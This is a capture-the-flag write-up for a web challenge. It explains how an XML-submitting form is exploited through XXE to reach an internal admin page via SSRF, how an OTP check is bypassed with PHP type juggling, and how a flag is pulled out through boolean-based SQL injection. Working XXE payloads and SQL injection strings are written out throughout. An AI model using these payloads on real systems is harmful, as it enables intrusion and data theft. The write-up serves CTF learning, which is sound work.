# Leaked new year DB


**Category:** Web

**Points:** 1000

**Description:**

kackers stole a gift recipient database and try to sell it on the Internet!
seems their application is not so secure.
They also have some secrets, get it!

http://tasks.open.kksctf.ru:20006/

Author: @thunderstorm8

## WriteUp 

Task starts with basic index page.

We have only one field under control and restricted page. no cookies, no strange headers.

`/robots.txt` has one entery with docker log where we could get the hostname.

Inspection of sources bring us strange obfuscated script:
   
   `<script type="text/javascript">
  var _0x2396=["","\x3C\x3F\x78\x6D\x6C\x20\x76\x65\x72\x73\x69\x6F\x6E\x3D\x22\x31\x2E\x30\x22\x20\x65\x6E\x63\x6F\x64\x69\x6E\x67\x3D\x22\x55\x54\x46\x2D\x38\x22\x3F\x3E","\x3C\x72\x6F\x6F\x74\x3E","\x3C\x65\x6D\x61\x69\x6C\x3E","\x76\x61\x6C","\x23\x65\x6D\x61\x69\x6C","\x3C\x2F\x65\x6D\x61\x69\x6C\x3E","\x3C\x2F\x72\x6F\x6F\x74\x3E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x6C\x6F\x67","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x65\x72\x72\x6F\x72\x4D\x65\x73\x73\x61\x67\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x50\x4F\x53\x54","\x70\x72\x6F\x63\x65\x73\x73\x2E\x70\x68\x70","\x6F\x70\x65\x6E","\x73\x65\x6E\x64"];function XMLFunction(){var _0xca21x2=_0x2396[0]+ _0x2396[1]+ _0x2396[2]+ _0x2396[3]+ $(_0x2396[5])[_0x2396[4]]()+ _0x2396[6]+ _0x2396[7];var _0xca21x3= new XMLHttpRequest();_0xca21x3[_0x2396[8]]= function(){if(_0xca21x3[_0x2396[9]]== 4){console[_0x2396[10]](_0xca21x3[_0x2396[9]]);console[_0x2396[10]](_0xca21x3[_0x2396[11]]);document[_0x2396[14]](_0x2396[13])[_0x2396[12]]= _0xca21x3[_0x2396[11]]}};_0xca21x3[_0x2396[17]](_0x2396[15],_0x2396[16],true);_0xca21x3[_0x2396[18]](_0xca21x2)}
  </script>`

After some magic it should be readeble:

`<script type="text/javascript">
    var xml = '<?xml version="1.0" encoding="UTF-8"?><root><email>val#email</email></root>'; 
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("POST","process.php",true);
    xmlhttp.send(xml);
    </script>`
    
Woah! it's frontend script for creating xml! burp could show us thats xml is fully controlled.

PFFFF easiest web in my life! only one XXE and flag is mine!

Suka blyad'! no LFI! where is my flag? admin allo!

Once LFI is not working try SSRF more that, we have seen admin area. its accessible from internal web.

Modifying a little xml we get a payload 

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:20005/admin.php">]><root><email>&test;</email></root>`

It's not working! AUGHHHH

STOP! docker log sad us about dockerhost! let's try again!! 

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://web/admin.php">]><root><email>&test;</email></root>`

It's not working!! oh god why??? and god sad us: HTML familiar with XML and breaks in in processing, encode it!

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=http://web/admin.php">]><root><email>&test;</email></root>`

OOOOOOOMG we got an admin pannel! but WTF, its a login pannel oh!

 `<form action="" method="get">
        <label>UserName :</label><input type="text" name="username" /><br /><br />
        <label>Password :</label><input type="password" name="password" /><br /><br />
        <label>otp :</label><input type="otp" name="otp" /><br /><br />
        <input type="submit" value=" Submit " /><br />
    </form>`

lets try to login, with a get query!

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=http://web/admin.php?username=1&password=2&otp=3">]><root><email>&test;</email></root>`

any data in query returns us "BAD OTP"

php is not a php if it is not comparasion bugs! rare type of type juggling brings us a luck!

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=http://web/admin.php?username=1&password=2&otp[]=3">]><root><email>&test;</email></root>`

just a moment! wtf is not working again! [] are XML special chars and we have to encode them with url encode

`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=http://web/admin.php?username=1&password=2&otp%5B%5D=3">]><root><email>&test;</email></root>`

luck again! we got "user doesn't exists" 

attempts to bruteforce are usless...

maybe its SQLI? we all love sqli!!!!!

`' or 1=1 -- returned "exists"`
`' or 1=0 -- returned "not exists"`

boolean based SQLI confirmed!

now u have 3 ways: 
    try to install sqlmap (its really hard cuz via XXE and sqlmap just crashes)
    write a proxy for sqlmalp to needed parameter
    do it manually (rly first solve for this task got a flag by hands, second too)

surprise! there is one more column 'secrets'

flag stored there!

    
